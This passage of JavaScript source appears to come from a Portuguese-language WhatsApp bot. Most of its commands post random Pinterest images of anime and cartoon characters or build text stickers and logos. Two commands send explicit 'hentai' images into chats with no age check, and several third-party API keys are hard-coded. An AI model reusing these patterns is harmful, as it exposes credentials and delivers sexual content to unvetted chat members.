					Pin.sendMessage(from, nye, image, { caption: 'kira!!', quoted: mek })
					await limitAdd(sender)
					break					
case 'CR7':

					reply(mess.wait)
					anu = await fetchJson(`https://fdciabdul.tech/api/pinterest?keyword=CR7`, {method: 'get'})
					min = JSON.parse(JSON.stringify(anu));
					ato =  min[Math.floor(Math.random() * min.length)];
					nye = await getBuffer(ato)
					Pin.sendMessage(from, nye, image, { caption: 'cericeti!!', quoted: mek })
					await limitAdd(sender)
					break						     	
case 'whis':

					reply(mess.wait)
					anu = await fetchJson(`https://fdciabdul.tech/api/pinterest?keyword=whis`, {method: 'get'})
					min = JSON.parse(JSON.stringify(anu));
					ato =  min[Math.floor(Math.random() * min.length)];
					nye = await getBuffer(ato)
					Pin.sendMessage(from, nye, image, { caption: 'whis!!', quoted: mek })
					await limitAdd(sender)
					break			     	
case 'trunks':

					reply(mess.wait)
					anu = await fetchJson(`https://fdciabdul.tech/api/pinterest?keyword=trunks`, {method: 'get'})
					min = JSON.parse(JSON.stringify(anu));
					ato =  min[Math.floor(Math.random() * min.length)];
					nye = await getBuffer(ato)
					Pin.sendMessage(from, nye, image, { caption: 'trunks!!', quoted: mek })
					await limitAdd(sender)
					break			     	
case 'gohan':

					reply(mess.wait)
					anu = await fetchJson(`https://fdciabdul.tech/api/pinterest?keyword=gohan`, {method: 'get'})
					min = JSON.parse(JSON.stringify(anu));
					ato =  min[Math.floor(Math.random() * min.length)];
					nye = await getBuffer(ato)
					Pin.sendMessage(from, nye, image, { caption: 'ficou inutil!!', quoted: mek })
					await limitAdd(sender)
					break			     	
case 'kuririn':

					reply(mess.wait)
					anu = await fetchJson(`https://fdciabdul.tech/api/pinterest?keyword=kuririn`, {method: 'get'})
					min = JSON.parse(JSON.stringify(anu));
					ato =  min[Math.floor(Math.random() * min.length)];
					nye = await getBuffer(ato)
					Pin.sendMessage(from, nye, image, { caption: 'kuririn!!', quoted: mek })
					await limitAdd(sender)
					break			     	
case 'gennos':

					reply(mess.wait)
					anu = await fetchJson(`https://fdciabdul.tech/api/pinterest?keyword=gennos`, {method: 'get'})
					min = JSON.parse(JSON.stringify(anu));
					ato =  min[Math.floor(Math.random() * min.length)];
					nye = await getBuffer(ato)
					Pin.sendMessage(from, nye, image, { caption: 'gennos!!', quoted: mek })
					await limitAdd(sender)
					break			     	
case 'todoroki':

					reply(mess.wait)
					anu = await fetchJson(`https://fdciabdul.tech/api/pinterest?keyword=todoroki`, {method: 'get'})
					min = JSON.parse(JSON.stringify(anu));
					ato =  min[Math.floor(Math.random() * min.length)];
					nye = await getBuffer(ato)
					Pin.sendMessage(from, nye, image, { caption: '🥵🥶!!', quoted: mek })
					await limitAdd(sender)
					break			     	
			     	
case 'bakugou':

					reply(mess.wait)
					anu = await fetchJson(`https://fdciabdul.tech/api/pinterest?keyword=bakugou`, {method: 'get'})
					min = JSON.parse(JSON.stringify(anu));
					ato =  min[Math.floor(Math.random() * min.length)];
					nye = await getBuffer(ato)
					Pin.sendMessage(from, nye, image, { caption: 'bakugou!', quoted: mek })
					await limitAdd(sender)
					break			     	
case 'bils':			     	
case 'bills':

					reply(mess.wait)
					anu = await fetchJson(`https://fdciabdul.tech/api/pinterest?keyword=bills`, {method: 'get'})
					min = JSON.parse(JSON.stringify(anu));
					ato =  min[Math.floor(Math.random() * min.length)];
					nye = await getBuffer(ato)
					Pin.sendMessage(from, nye, image, { caption: 'bills!!', quoted: mek })
					await limitAdd(sender)
					break			     	
case 'zoro':

					reply(mess.wait)
					anu = await fetchJson(`https://fdciabdul.tech/api/pinterest?keyword=zoro`, {method: 'get'})
					min = JSON.parse(JSON.stringify(anu));
					ato =  min[Math.floor(Math.random() * min.length)];
					nye = await getBuffer(ato)
					Pin.sendMessage(from, nye, image, { caption: 'zoro sola né pae!!', quoted: mek })
					await limitAdd(sender)
					break
case 'gaara':

					reply(mess.wait)
					anu = await fetchJson(`https://fdciabdul.tech/api/pinterest?keyword=gaara`, {method: 'get'})
					min = JSON.parse(JSON.stringify(anu));
					ato =  min[Math.floor(Math.random() * min.length)];
					nye = await getBuffer(ato)
					Pin.sendMessage(from, nye, image, { caption: 'gaara!', quoted: mek })
					await limitAdd(sender)
					break					
case 'picolo':

					reply(mess.wait)
					anu = await fetchJson(`https://fdciabdul.tech/api/pinterest?keyword=picolo`, {method: 'get'})
					min = JSON.parse(JSON.stringify(anu));
					ato =  min[Math.floor(Math.random() * min.length)];
					nye = await getBuffer(ato)
					Pin.sendMessage(from, nye, image, { caption: 'picolo!!', quoted: mek })
					await limitAdd(sender)
					break					
case 'wins':

					reply(mess.wait)
					anu = await fetchJson(`https://fdciabdul.tech/api/pinterest?keyword=super wins`, {method: 'get'})
					min = JSON.parse(JSON.stringify(anu));
					ato =  min[Math.floor(Math.random() * min.length)];
					nye = await getBuffer(ato)
					Pin.sendMessage(from, nye, image, { caption: 'wins!!', quoted: mek })
					await limitAdd(sender)
					break					
case 'steve':

					reply(mess.wait)
					anu = await fetchJson(`https://fdciabdul.tech/api/pinterest?keyword=steve universe`, {method: 'get'})
					min = JSON.parse(JSON.stringify(anu));
					ato =  min[Math.floor(Math.random() * min.length)];
					nye = await getBuffer(ato)
					Pin.sendMessage(from, nye, image, { caption: 'steve!!', quoted: mek })
					await limitAdd(sender)
					break					
case 'mordecai':

					reply(mess.wait)
					anu = await fetchJson(`https://fdciabdul.tech/api/pinterest?keyword=mordecai`, {method: 'get'})
					min = JSON.parse(JSON.stringify(anu));
					ato =  min[Math.floor(Math.random() * min.length)];
					nye = await getBuffer(ato)
					Pin.sendMessage(from, nye, image, { caption: 'mordecai!!', quoted: mek })
					await limitAdd(sender)
					break					
case 'bob':

					reply(mess.wait)
					anu = await fetchJson(`https://fdciabdul.tech/api/pinterest?keyword=bob esponja`, {method: 'get'})
					min = JSON.parse(JSON.stringify(anu));
					ato =  min[Math.floor(Math.random() * min.length)];
					nye = await getBuffer(ato)
					Pin.sendMessage(from, nye, image, { caption: 'bob esponja!!', quoted: mek })
					await limitAdd(sender)
					break					
case 'picapau':

					reply(mess.wait)
					anu = await fetchJson(`https://fdciabdul.tech/api/pinterest?keyword=picapau`, {method: 'get'})
					min = JSON.parse(JSON.stringify(anu));
					ato =  min[Math.floor(Math.random() * min.length)];
					nye = await getBuffer(ato)
					Pin.sendMessage(from, nye, image, { caption: 'picapau!', quoted: mek })
					await limitAdd(sender)
					break					
case 'frajola':

					reply(mess.wait)
					anu = await fetchJson(`https://fdciabdul.tech/api/pinterest?keyword=frajola`, {method: 'get'})
					min = JSON.parse(JSON.stringify(anu));
					ato =  min[Math.floor(Math.random() * min.length)];
					nye = await getBuffer(ato)
					Pin.sendMessage(from, nye, image, { caption: 'frajola!', quoted: mek })
					await limitAdd(sender)
					break					
case 'ben10':

					reply(mess.wait)
					anu = await fetchJson(`https://fdciabdul.tech/api/pinterest?keyword=ben10`, {method: 'get'})
					min = JSON.parse(JSON.stringify(anu));
					ato =  min[Math.floor(Math.random() * min.length)];
					nye = await getBuffer(ato)
					Pin.sendMessage(from, nye, image, { caption: 'ben10!!', quoted: mek })
					await limitAdd(sender)
					break					
case 'migthgay':

					reply(mess.wait)
					anu = await fetchJson(`https://fdciabdul.tech/api/pinterest?keyword=might gay`, {method: 'get'})
					min = JSON.parse(JSON.stringify(anu));
					ato =  min[Math.floor(Math.random() * min.length)];
					nye = await getBuffer(ato)
					Pin.sendMessage(from, nye, image, { caption: 'migth gay!!', quoted: mek })
					await limitAdd(sender)
					break					
case 'garou':

					reply(mess.wait)
					anu = await fetchJson(`https://fdciabdul.tech/api/pinterest?keyword=garou`, {method: 'get'})
					min = JSON.parse(JSON.stringify(anu));
					ato =  min[Math.floor(Math.random() * min.length)];
					nye = await getBuffer(ato)
					Pin.sendMessage(from, nye, image, { caption: 'garou!!', quoted: mek })
					await limitAdd(sender)
					break					
case 'batman':

					reply(mess.wait)
					anu = await fetchJson(`https://fdciabdul.tech/api/pinterest?keyword=batman`, {method: 'get'})
					min = JSON.parse(JSON.stringify(anu));
					ato =  min[Math.floor(Math.random() * min.length)];
					nye = await getBuffer(ato)
					Pin.sendMessage(from, nye, image, { caption: 'batman!', quoted: mek })
					await limitAdd(sender)
					break					
case 'coringa':					
case 'joker':

					reply(mess.wait)
					anu = await fetchJson(`https://fdciabdul.tech/api/pinterest?keyword=joker`, {method: 'get'})
					min = JSON.parse(JSON.stringify(anu));
					ato =  min[Math.floor(Math.random() * min.length)];
					nye = await getBuffer(ato)
					Pin.sendMessage(from, nye, image, { caption: 'joker!!', quoted: mek })
					await limitAdd(sender)
					break					
case 'thanos':

					reply(mess.wait)
					anu = await fetchJson(`https://fdciabdul.tech/api/pinterest?keyword=thanos`, {method: 'get'})
					min = JSON.parse(JSON.stringify(anu));
					ato =  min[Math.floor(Math.random() * min.length)];
					nye = await getBuffer(ato)
					Pin.sendMessage(from, nye, image, { caption: 'thanos!!', quoted: mek })
					await limitAdd(sender)
					break					
case 'thor':

					reply(mess.wait)
					anu = await fetchJson(`https://fdciabdul.tech/api/pinterest?keyword=thor`, {method: 'get'})
					min = JSON.parse(JSON.stringify(anu));
					ato =  min[Math.floor(Math.random() * min.length)];
					nye = await getBuffer(ato)
					Pin.sendMessage(from, nye, image, { caption: 'Thor!', quoted: mek })
					await limitAdd(sender)
					break					
case 'hulk':

					reply(mess.wait)
					anu = await fetchJson(`https://fdciabdul.tech/api/pinterest?keyword=hulk`, {method: 'get'})
					min = JSON.parse(JSON.stringify(anu));
					ato =  min[Math.floor(Math.random() * min.length)];
					nye = await getBuffer(ato)
					Pin.sendMessage(from, nye, image, { caption: 'hulk!!', quoted: mek })
					await limitAdd(sender)
					break					
case 'bardock':

					reply(mess.wait)
					anu = await fetchJson(`https://fdciabdul.tech/api/pinterest?keyword=bardock`, {method: 'get'})
					min = JSON.parse(JSON.stringify(anu));
					ato =  min[Math.floor(Math.random() * min.length)];
					nye = await getBuffer(ato)
					Pin.sendMessage(from, nye, image, { caption: 'bardock!!', quoted: mek })
					await limitAdd(sender)
					break					
case 'sarada':

					reply(mess.wait)
					anu = await fetchJson(`https://fdciabdul.tech/api/pinterest?keyword=sarada uchiha`, {method: 'get'})
					min = JSON.parse(JSON.stringify(anu));
					ato =  min[Math.floor(Math.random() * min.length)];
					nye = await getBuffer(ato)
					Pin.sendMessage(from, nye, image, { caption: 'sarada!', quoted: mek })
					await limitAdd(sender)
					break					
case 'boruto':

					reply(mess.wait)
					anu = await fetchJson(`https://fdciabdul.tech/api/pinterest?keyword=boruto`, {method: 'get'})
					min = JSON.parse(JSON.stringify(anu));
					ato =  min[Math.floor(Math.random() * min.length)];
					nye = await getBuffer(ato)
					Pin.sendMessage(from, nye, image, { caption: 'boruto!!', quoted: mek })
					await limitAdd(sender)
					break					
case 'tsunade':

					reply(mess.wait)
					anu = await fetchJson(`https://fdciabdul.tech/api/pinterest?keyword=tsunade`, {method: 'get'})
					min = JSON.parse(JSON.stringify(anu));
					ato =  min[Math.floor(Math.random() * min.length)];
					nye = await getBuffer(ato)
					Pin.sendMessage(from, nye, image, { caption: 'tsunade!!', quoted: mek })
					await limitAdd(sender)
					break					
case 'hinata':

					reply(mess.wait)
					anu = await fetchJson(`https://fdciabdul.tech/api/pinterest?keyword=hinata`, {method: 'get'})
					min = JSON.parse(JSON.stringify(anu));
					ato =  min[Math.floor(Math.random() * min.length)];
					nye = await getBuffer(ato)
					Pin.sendMessage(from, nye, image, { caption: 'braba!!', quoted: mek })
					await limitAdd(sender)
					break							
case 'sakura':

					reply(mess.wait)
					anu = await fetchJson(`https://fdciabdul.tech/api/pinterest?keyword=Sakura`, {method: 'get'})
					min = JSON.parse(JSON.stringify(anu));
					ato =  min[Math.floor(Math.random() * min.length)];
					nye = await getBuffer(ato)
					Pin.sendMessage(from, nye, image, { caption: 'testuda!!', quoted: mek })
					await limitAdd(sender)
					break						     	
case 'kakashi':

					reply(mess.wait)
					anu = await fetchJson(`https://fdciabdul.tech/api/pinterest?keyword=kakashi`, {method: 'get'})
					min = JSON.parse(JSON.stringify(anu));
					ato =  min[Math.floor(Math.random() * min.length)];
					nye = await getBuffer(ato)
					Pin.sendMessage(from, nye, image, { caption: 'sem chakra!!', quoted: mek })
					await limitAdd(sender)
					break			     	
case 'madara':

					reply(mess.wait)
					anu = await fetchJson(`https://fdciabdul.tech/api/pinterest?keyword=madara`, {method: 'get'})
					min = JSON.parse(JSON.stringify(anu));
					ato =  min[Math.floor(Math.random() * min.length)];
					nye = await getBuffer(ato)
					Pin.sendMessage(from, nye, image, { caption: 'madarão!!', quoted: mek })
					await limitAdd(sender)
					break			     	
case 'rocklee':

					reply(mess.wait)
					anu = await fetchJson(`https://fdciabdul.tech/api/pinterest?keyword=rocklee`, {method: 'get'})
					min = JSON.parse(JSON.stringify(anu));
					ato =  min[Math.floor(Math.random() * min.length)];
					nye = await getBuffer(ato)
					Pin.sendMessage(from, nye, image, { caption: 'rock lee!!', quoted: mek })
					await limitAdd(sender)
					break			     	
case 'asta':

					reply(mess.wait)
					anu = await fetchJson(`https://fdciabdul.tech/api/pinterest?keyword=asta`, {method: 'get'})
					min = JSON.parse(JSON.stringify(anu));
					ato =  min[Math.floor(Math.random() * min.length)];
					nye = await getBuffer(ato)
					Pin.sendMessage(from, nye, image, { caption: 'asta!', quoted: mek })
					await limitAdd(sender)
					break			     	
case 'pikachu':

					reply(mess.wait)
					anu = await fetchJson(`https://fdciabdul.tech/api/pinterest?keyword=pikachu`, {method: 'get'})
					min = JSON.parse(JSON.stringify(anu));
					ato =  min[Math.floor(Math.random() * min.length)];
					nye = await getBuffer(ato)
					Pin.sendMessage(from, nye, image, { caption: 'pikachu!!', quoted: mek })
					await limitAdd(sender)
					break			     	
case 'eren':

					reply(mess.wait)
					anu = await fetchJson(`https://fdciabdul.tech/api/pinterest?keyword=eren`, {method: 'get'})
					min = JSON.parse(JSON.stringify(anu));
					ato =  min[Math.floor(Math.random() * min.length)];
					nye = await getBuffer(ato)
					Pin.sendMessage(from, nye, image, { caption: 'eren!!', quoted: mek })
					await limitAdd(sender)
					break			     	
case 'escanor':

					reply(mess.wait)
					anu = await fetchJson(`https://fdciabdul.tech/api/pinterest?keyword=escanor`, {method: 'get'})
					min = JSON.parse(JSON.stringify(anu));
					ato =  min[Math.floor(Math.random() * min.length)];
					nye = await getBuffer(ato)
					Pin.sendMessage(from, nye, image, { caption: 'escanor!!', quoted: mek })
					await limitAdd(sender)
					break			     	
case 'meliodas':

					reply(mess.wait)
					anu = await fetchJson(`https://fdciabdul.tech/api/pinterest?keyword=meliodas`, {method: 'get'})
					min = JSON.parse(JSON.stringify(anu));
					ato =  min[Math.floor(Math.random() * min.length)];
					nye = await getBuffer(ato)
					Pin.sendMessage(from, nye, image, { caption: 'meliodas!!', quoted: mek })
					await limitAdd(sender)
					break
								     	
case 'zenitsu':

					reply(mess.wait)
					anu = await fetchJson(`https://fdciabdul.tech/api/pinterest?keyword=zenitsu`, {method: 'get'})
					min = JSON.parse(JSON.stringify(anu));
					ato =  min[Math.floor(Math.random() * min.length)];
					nye = await getBuffer(ato)
					Pin.sendMessage(from, nye, image, { caption: 'zenitsu!!', quoted: mek })
					await limitAdd(sender)
					break			     	
case 'freeza':

					reply(mess.wait)
					anu = await fetchJson(`https://fdciabdul.tech/api/pinterest?keyword=freeze`, {method: 'get'})
					min = JSON.parse(JSON.stringify(anu));
					ato =  min[Math.floor(Math.random() * min.length)];
					nye = await getBuffer(ato)
					Pin.sendMessage(from, nye, image, { caption: 'meu vilão favorito!!', quoted: mek })
					await limitAdd(sender)
					break			     	
case 'broly':

					reply(mess.wait)
					anu = await fetchJson(`https://fdciabdul.tech/api/pinterest?keyword=broly`, {method: 'get'})
					min = JSON.parse(JSON.stringify(anu));
					ato =  min[Math.floor(Math.random() * min.length)];
					nye = await getBuffer(ato)
					Pin.sendMessage(from, nye, image, { caption: 'broly!!', quoted: mek })
					await limitAdd(sender)
					break
case 'saitama':

					reply(mess.wait)
					anu = await fetchJson(`https://fdciabdul.tech/api/pinterest?keyword=saitama`, {method: 'get'})
					min = JSON.parse(JSON.stringify(anu));
					ato =  min[Math.floor(Math.random() * min.length)];
					nye = await getBuffer(ato)
					Pin.sendMessage(from, nye, image, { caption: 'meu herói favorito!!', quoted: mek })
					await limitAdd(sender)
					break
case 'kaneki':

					reply(mess.wait)
					anu = await fetchJson(`https://fdciabdul.tech/api/pinterest?keyword=kaneki`, {method: 'get'})
					min = JSON.parse(JSON.stringify(anu));
					ato =  min[Math.floor(Math.random() * min.length)];
					nye = await getBuffer(ato)
					Pin.sendMessage(from, nye, image, { caption: 'kaneki!!', quoted: mek })
					await limitAdd(sender)
					break			     	
case 'luffy':

					reply(mess.wait)
					anu = await fetchJson(`https://fdciabdul.tech/api/pinterest?keyword=luffy`, {method: 'get'})
					min = JSON.parse(JSON.stringify(anu));
					ato =  min[Math.floor(Math.random() * min.length)];
					nye = await getBuffer(ato)
					Pin.sendMessage(from, nye, image, { caption: 'luffy!!', quoted: mek })
					await limitAdd(sender)
					break			     				
case 'vegeta':

					reply(mess.wait)
					anu = await fetchJson(`https://fdciabdul.tech/api/pinterest?keyword=vegeta`, {method: 'get'})
					min = JSON.parse(JSON.stringify(anu));
					ato =  min[Math.floor(Math.random() * min.length)];
					nye = await getBuffer(ato)
					Pin.sendMessage(from, nye, image, { caption: 'princepi!!', quoted: mek })
					await limitAdd(sender)
					break			     	
case 'sasuke':

					reply(mess.wait)
					anu = await fetchJson(`https://fdciabdul.tech/api/pinterest?keyword=sasuke`, {method: 'get'})
					min = JSON.parse(JSON.stringify(anu));
					ato =  min[Math.floor(Math.random() * min.length)];
					nye = await getBuffer(ato)
					Pin.sendMessage(from, nye, image, { caption: 'sasuke!!', quoted: mek })
					await limitAdd(sender)
					break
								     	
case 'jiraya':

					reply(mess.wait)
					anu = await fetchJson(`https://fdciabdul.tech/api/pinterest?keyword=jiraya`, {method: 'get'})
					min = JSON.parse(JSON.stringify(anu));
					ato =  min[Math.floor(Math.random() * min.length)];
					nye = await getBuffer(ato)
					Pin.sendMessage(from, nye, image, { caption: 'meu herói favorito!!', quoted: mek })
					await limitAdd(sender)
					break			     									
case 'nobara':

					reply(mess.wait)
					anu = await fetchJson(`https://fdciabdul.tech/api/pinterest?keyword=nobara`, {method: 'get'})
					min = JSON.parse(JSON.stringify(anu));
					ato =  min[Math.floor(Math.random() * min.length)];
					nye = await getBuffer(ato)
					Pin.sendMessage(from, nye, image, { caption: 'nobara!', quoted: mek })
					await limitAdd(sender)
					break
							
case 'sukuna':							
case 'Sukuna':

					reply(mess.wait)
					anu = await fetchJson(`https://fdciabdul.tech/api/pinterest?keyword=sukuna`, {method: 'get'})
					min = JSON.parse(JSON.stringify(anu));
					ato =  min[Math.floor(Math.random() * min.length)];
					nye = await getBuffer(ato)
					Pin.sendMessage(from, nye, image, { caption: 'sukuna!!', quoted: mek })
					await limitAdd(sender)
					break					
					
case 'mirio':					
case 'lemillion':

					reply(mess.wait)
					anu = await fetchJson(`https://fdciabdul.tech/api/pinterest?keyword=mirio togata`, {method: 'get'})
					min = JSON.parse(JSON.stringify(anu));
					ato =  min[Math.floor(Math.random() * min.length)];
					nye = await getBuffer(ato)
					Pin.sendMessage(from, nye, image, { caption: 'brabo!!', quoted: mek })
					await limitAdd(sender)
					break	
case 'cyberpunk':

					reply(mess.wait)
					anu = await fetchJson(`https://fdciabdul.tech/api/pinterest?keyword=cyberpunk`, {method: 'get'})
					min = JSON.parse(JSON.stringify(anu));
					ato =  min[Math.floor(Math.random() * min.length)];
					nye = await getBuffer(ato)
					Pin.sendMessage(from, nye, image, { caption: 'cyberpunk!', quoted: mek })
					await limitAdd(sender)
					break						
case 'midoriya':

					reply(mess.wait)
					anu = await fetchJson(`https://fdciabdul.tech/api/pinterest?keyword=midoriya`, {method: 'get'})
					min = JSON.parse(JSON.stringify(anu));
					ato =  min[Math.floor(Math.random() * min.length)];
					nye = await getBuffer(ato)
					Pin.sendMessage(from, nye, image, { caption: 'meu herói favorito!!', quoted: mek })
					await limitAdd(sender)
					break
case 'hentaipict': 
				reply(`[❕] Loading`)
				anu = await fetchJson(`https://onlydevcity.herokuapp.com/api/hentai?apikey=onlyonedeveloper`)
				buffer = await getBuffer(anu.result.result)
				Pin.sendMessage(from, buffer, image, {quoted: mek })
				break					
case 'hentai1': 
reply('Enviando...., se der erro tente novamente')
buffer = await getBuffer(`https://hadi-api.herokuapp.com/api/neko2`)
Pin.sendMessage(from, buffer, image, { caption: 'c bate pra personagem 2dkkkk',quoted: mek})
break					

case 'grafitir':
teks = body.slice(9)
kratosdominar = await getBuffer(`https://hadi-api.herokuapp.com/api/photoxy/grafiti-text-cover?teks=${teks}`)
Pin.sendMessage(from, kratosdominar, image, {quoted: mek })
break 

case 'barbabranca':

					reply(mess.wait)
					anu = await fetchJson(`https://fdciabdul.tech/api/pinterest?keyword=edward newgate`, {method: 'get'})
					min = JSON.parse(JSON.stringify(anu));
					ato =  min[Math.floor(Math.random() * min.length)];
					nye = await getBuffer(ato)
					Pin.sendMessage(from, nye, image, { caption: 'barba branca!!', quoted: mek })
					await limitAdd(sender)
					break					
case 'android17':

					reply(mess.wait)
					anu = await fetchJson(`https://fdciabdul.tech/api/pinterest?keyword=android17`, {method: 'get'})
					min = JSON.parse(JSON.stringify(anu));
					ato =  min[Math.floor(Math.random() * min.length)];
					nye = await getBuffer(ato)
					Pin.sendMessage(from, nye, image, { caption: 'N° 17!!', quoted: mek })
					await limitAdd(sender)
					break					
					
					
case 'opai':

					reply(mess.wait)
					anu = await fetchJson(`https://fdciabdul.tech/api/pinterest?keyword=opai`, {method: 'get'})
					min = JSON.parse(JSON.stringify(anu));
					ato =  min[Math.floor(Math.random() * min.length)];
					nye = await getBuffer(ato)
					Pin.sendMessage(from, nye, image, { caption: 'HMMM', quoted: mek })
					await limitAdd(sender)
					break	
					
case 'jiren':

					reply(mess.wait)
					anu = await fetchJson(`https://fdciabdul.tech/api/pinterest?keyword=jiren`, {method: 'get'})
					min = JSON.parse(JSON.stringify(anu));
					ato =  min[Math.floor(Math.random() * min.length)];
					nye = await getBuffer(ato)
					Pin.sendMessage(from, nye, image, { caption: 'alienigina mais foda de drango ball', quoted: mek })
					await limitAdd(sender)
					break

									
									
										
case 'minato':

					reply(mess.wait)
					anu = await fetchJson(`https://fdciabdul.tech/api/pinterest?keyword=Minato`, {method: 'get'})
					min = JSON.parse(JSON.stringify(anu));
					ato =  min[Math.floor(Math.random() * min.length)];
					nye = await getBuffer(ato)
					Pin.sendMessage(from, nye, image, { caption: 'minato!!', quoted: mek })
					await limitAdd(sender)
					break				




case 'plogo':
					if (args.length < 1) return reply(mess.blank)
					teks = body.slice(7)
					if (teks.length > 15) return reply('O texto é longo, até 15 caracteres')
					reply('*ESTOU PROCESSANDO,SE DER ERRO TENTE NOVAMENTE🦧*')
					buffer = await getBuffer(`https://clutamac.sirv.com/1011b781-bab1-49e3-89db-ee2c064868fa%20(1).jpg?text.0.text=${teks}&text.0.position.gravity=northwest&text.0.position.x=22%25&text.0.position.y=60%25&text.0.size=18&text.0.color=000000&text.0.opacity=47&text.0.font.family=Roboto%20Mono&text.0.font.style=italic`)
					Pin.sendMessage(from, buffer, image, {quoted: mek, caption: '*PRONTINHO ✓*\n\n*DONO CASE:* JUNHIN'})
					break
					
					
					
					
case 'attp':				
case 'sttc':
                   
			     	if (args.length < 1) return reply(`_Coloque o texto _\n\n*Exemplo ${prefix}stc junhin*`)  
			     	            reply('*ESTOU PROCESSANDO,SE DER ERRO TENTE NOVAMENTE🦧*')
                                url = encodeURI(`https://api.xteam.xyz/attp?file&text=${body.slice(6)}`)
		    		attp2 = await getBuffer(url)
			    	Pin.sendMessage(from, attp2, sticker, {quoted: mek})
			     	break

case 'attp2':	
if (args.length < 1) return reply(`_Coloque o texto _\n\n*Exemplo ${prefix}attp2 junhin*`)  
 reply('*ESTOU PROCESSANDO,SE DER ERRO TENTE NOVAMENTE🦧*')
url = encodeURI(`http://brizas-api.herokuapp.com/ttp/attp2?apikey=brizaloka&text=${body.slice(6)}`)
send = await getBuffer(url)
Pin.sendMessage(from, send, sticker, {quoted: mek})
			     	break	
	case 'attp3':	
if (args.length < 1) return reply(`_Coloque o texto _\n\n*Exemplo ${prefix}attp3 junhin*`)  
 reply('*ESTOU PROCESSANDO,SE DER ERRO TENTE NOVAMENTE🦧*')
url = encodeURI(`http://brizas-api.herokuapp.com/ttp/attp3?apikey=brizaloka&text=${body.slice(6)}`)
send = await getBuffer(url)
Pin.sendMessage(from, send, sticker, {quoted: mek})
			     	break	
	case 'attp4':	
if (args.length < 1) return reply(`_Coloque o texto _\n\n*Exemplo ${prefix}attp4 junhin*`)  
 reply('*ESTOU PROCESSANDO,SE DER ERRO TENTE NOVAMENTE🦧*')
url = encodeURI(`http://brizas-api.herokuapp.com/ttp/attp4?apikey=brizaloka&text=${body.slice(6)}`)
send = await getBuffer(url)
Pin.sendMessage(from, send, sticker, {quoted: mek})
			     	break	
		case 'attp5':	
if (args.length < 1) return reply(`_Coloque o texto _\n\n*Exemplo ${prefix}attp5 junhin*`)  
 reply('*ESTOU PROCESSANDO,SE DER ERRO TENTE NOVAMENTE🦧*')
url = encodeURI(`http://brizas-api.herokuapp.com/ttp/attp5?apikey=brizaloka&text=${body.slice(6)}`)
send = await getBuffer(url)
Pin.sendMessage(from, send, sticker, {quoted: mek})
			     	break
case 'attp6':	
if (args.length < 1) return reply(`_Coloque o texto _\n\n*Exemplo ${prefix}attp6 junhin*`)  
 reply('*ESTOU PROCESSANDO,SE DER ERRO TENTE NOVAMENTE🦧*')
url = encodeURI(`http://brizas-api.herokuapp.com/ttp/attp6?apikey=brizaloka&text=${body.slice(6)}`)
send = await getBuffer(url)
Pin.sendMessage(from, send, sticker, {quoted: mek})
			     	break

case 'logo1':
					if (args.length < 1) return reply(mess.blank)
					teks = body.slice(7)
					if (teks.length > 10) return reply('🛑O texto é grande demais máximo 10 caracterís 🛑')
					reply('*⏳Estou fazendo, se der erro tente novamente!⏳“*')
					buffer = await getBuffer(`https://ietostut.sirv.com/Screenshot_20210706-152232~3.png?text.0.text=${teks}&text.0.position.x=-45%25&text.0.position.y=-35%25&text.0.size=24&text.0.color=000000&text.0.opacity=69&text.0.font.family=Acme&text.0.font.style=italic&text.0.background.opacity=100&text.0.outline.blur=100`)
					Pin.sendMessage(from, buffer, image, {quoted: mek, caption: '✔️ PRONTINHO PUNHETEIRO ✔️\n\n𝙳𝙾𝙽𝙾: JUNHIN'})
					break
					
case 'plogo2':
					if (args.length < 1) return reply(mess.blank)
					teks = body.slice(7)
					if (teks.length > 20) return reply('O TEXTO E MUITO GRANDE NO MAXIMO 20 LETRAS')
					reply('ESPERE...')
					buffer = await getBuffer(`https://lculitas.sirv.com/ET-C535XsAI0sEt.jpg?text.0.text=${teks}&text.0.position.gravity=center&text.0.position.x=11%25&text.0.position.y=13%25&text.0.align=left&text.0.size=30&text.0.color=3e2e2e&text.0.opacity=52&text.0.background.color=c63aa6&text.0.background.opacity=2&text.0.outline.color=ff0000&text.0.outline.blur=100`)
					Pin.sendMessage(from, buffer, image, {quoted: mek, caption: 'PRONTINHO AQUI ESTAR SUA PLAQUINHA ✓*\n\n𝙳𝙾𝙽𝙾: JUNHIN'})
					break
					
case 'jokerlogo':
					if (args.length < 1) return reply(mess.blank)
					teks = body.slice(10)
					if (teks.length > 20) return reply('O TEXTO E MUITO GRANDE NO MAXIMO 20 LETRAS')
					reply('ESPERE...')
					buffer = await getBuffer(`https://lolhuman.herokuapp.com/api/textprome/jokerlogo?apikey=4ebd73aedd97d30f84b11668&text=${teks}`)
					Pin.sendMessage(from, buffer, image, {quoted: mek, caption: 'PRONTINHO AQUI ESTAR SUA LOGO ✓*\n\n𝙳𝙾𝙽𝙾: JUNHIN'})
					break					
					
case 'plaquinha2':
					if (args.length < 1) return reply(mess.blank)
					teks = body.slice(12)
					if (teks.length > 25) return reply('O texto é longo, até 25 caracteres')
					reply('*Estou fazendo, se der erro tente novamente ✓*')
					buffer = await getBuffer(`https://ubbornag.sirv.com/Screenshot_20210513-151821.png?text.0.text=${teks}&text.0.position.x=-40%25&text.0.position.y=-65%25&text.0.size=30&text.0.color=000000&text.0.opacity=53&text.0.font.family=Shadows%20Into%20Light%20Two&text.0.outline.blur=15`)
					Pin.sendMessage(from, buffer, image, {quoted: mek, caption: 'Ta na mão 😈\n\n𝙳𝙾𝙽𝙾: JUNHIN'})
					break
case 'plaquinha3':
					if (args.length < 1) return reply(mess.blank)
					teks = body.slice(11)
					if (teks.length > 10) return reply('O texto é longo, até 10 caracteres')
					reply('*Estou fazendo... *')
					buffer = await getBuffer(`https://rsymenti.sirv.com/images%20(10).jpeg?text.0.text=${teks}&text.0.position.gravity=south&text.0.position.x=4%25&text.0.position.y=-32%25&text.0.align=left&text.0.size=34&text.0.color=000000&text.0.opacity=78&text.0.background.opacity=78&text.0.outline.blur=72&text.0.outline.opacity=74`)
					Pin.sendMessage(from, buffer, image, {quoted: mek, caption: 'Tomar senpai'})
					break					
case 'plaquinha':
					if (args.length < 1) return reply(mess.blank)
					teks = body.slice(10)
					if (teks.length > 20) return reply('O TEXTO E MUITO GRANDE NO MAXIMO 20 LETRAS')
					reply('ESPERE...')
					buffer = await getBuffer(`https://lculitas.sirv.com/ETw3FRnXgAI3Up_.jpg?text.0.text=${teks}&text.0.position.gravity=center&text.0.align=left&text.0.size=46&text.0.color=221b1b&text.0.opacity=47&text.0.font.family=Architects%20Daughter&text.0.background.color=783852&text.0.background.opacity=5&text.0.outline.blur=58`)
